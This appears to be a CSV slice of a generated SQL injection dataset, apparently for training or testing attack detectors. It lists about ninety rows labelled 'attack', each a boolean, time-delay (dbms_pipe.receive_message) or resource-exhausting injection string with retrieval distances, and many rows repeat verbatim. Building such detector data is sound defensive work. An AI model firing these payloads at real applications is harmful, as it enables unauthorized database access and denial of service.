id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000409,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R001394,5.016488720900876
GAN_000410,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.604784561321697
GAN_000411,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,5.424388849628753
GAN_000412,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,7.644493618064044
GAN_000413,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.961309157309435
GAN_000414,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.900807177698106
GAN_000415,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.803545649085232
GAN_000416,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,6.560144263110752
GAN_000417,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.5144587596422605
GAN_000418,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.610948919604472
GAN_000419,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.914260131425434
GAN_000420,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,4.781651899111299
GAN_000421,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,8.119099659292408
GAN_000422,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.098867266855277
GAN_000423,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.635143690942387
GAN_000424,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,4.984188752848386
GAN_000425,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.714323523784237
GAN_000426,attack,boolean,"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",nearest_attack_euclidean,R000248,7.320028858172211
GAN_000427,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.416402967745759
GAN_000428,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,8.433351714716158
GAN_000429,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,5.027266972873756
GAN_000430,attack,boolean,"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'msjw' like 'msjw",nearest_attack_euclidean,R000544,8.217743216652442
GAN_000431,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.875644778919788
GAN_000432,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.054121174731721
GAN_000433,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,11.148660685691397
GAN_000434,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.198708302887361
GAN_000435,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.1190959294969085
GAN_000436,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.502268861881549
GAN_000437,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,8.553665701478858
GAN_000438,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.606252677791452
GAN_000439,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.023672943238571
GAN_000440,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.5986350166465995
GAN_000441,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,6.428233481981328
GAN_000442,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,12.711707285665785
GAN_000443,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.760250874600866
GAN_000444,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,7.48893257370126
GAN_000445,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.591842967215975
GAN_000446,attack,boolean,"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",nearest_attack_euclidean,R000444,6.5385468861183895
GAN_000447,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000479,5.167973390562124
GAN_000448,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.076117917953816
GAN_000449,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,8.146785657633238
GAN_000450,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.148893701026032
GAN_000451,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.742260709227862
GAN_000452,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.027871218321956
GAN_000453,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.539948609450945
GAN_000454,attack,boolean,-4900'   )    )    or 7208  =  3236,nearest_attack_euclidean,R000716,7.525870262230009
GAN_000455,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000429,5.0570131120581125
GAN_000456,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,6.845464919012381
GAN_000457,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.011558225208025
GAN_000458,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.087051053324712
GAN_000459,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,7.2180902953833135
GAN_000460,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,6.48258541476401
GAN_000461,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,4.9172424445377025
GAN_000462,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.729524801035166
GAN_000463,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,6.06856894740508
GAN_000464,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,5.135773734667716
GAN_000465,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.212248649206042
GAN_000466,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,6.490861129355545
GAN_000467,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.103427640298834
GAN_000468,attack,boolean,-4900'   )    )    or 7208  =  3236,nearest_attack_euclidean,R000716,6.819674246636239
GAN_000469,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.334793443599354
GAN_000470,attack,boolean,"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001119,3.780351936988914
GAN_000471,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,4.797194812146141
GAN_000472,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.7931477626981716
GAN_000473,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,7.507472049464428
GAN_000474,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.262716869808236
GAN_000475,attack,boolean,"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",nearest_attack_euclidean,R001511,4.325632019167751
GAN_000476,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,3.825024125430099
GAN_000477,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,5.361726588130889
GAN_000478,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.528396552092626
GAN_000479,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,7.2363106493305835
GAN_000480,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.242557781999295
GAN_000481,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,7.706980228608249
GAN_000482,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,4.996181177277309
GAN_000483,attack,boolean,"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001119,4.4866159110420005
GAN_000484,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,6.621068354997444
GAN_000485,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.798705855462607
GAN_000486,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,4.573226603207108
GAN_000487,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.358190227618101
GAN_000488,attack,boolean,-4900'   )    )    or 7208  =  3236,nearest_attack_euclidean,R000716,4.60390498870485
GAN_000489,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,5.013189163896384
GAN_000490,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.80249863740387
GAN_000491,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,7.986227393596351
GAN_000492,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.456657967104036
GAN_000493,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.018470825342482
GAN_000494,attack,boolean,"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",nearest_attack_euclidean,R000248,8.050227981040893
GAN_000495,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.48869869724075
GAN_000496,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,7.970261037884807
GAN_000497,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.35942515651791
GAN_000498,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.224735649782588
GAN_000499,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.157619013548442
GAN_000500,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000429,6.27152261717369
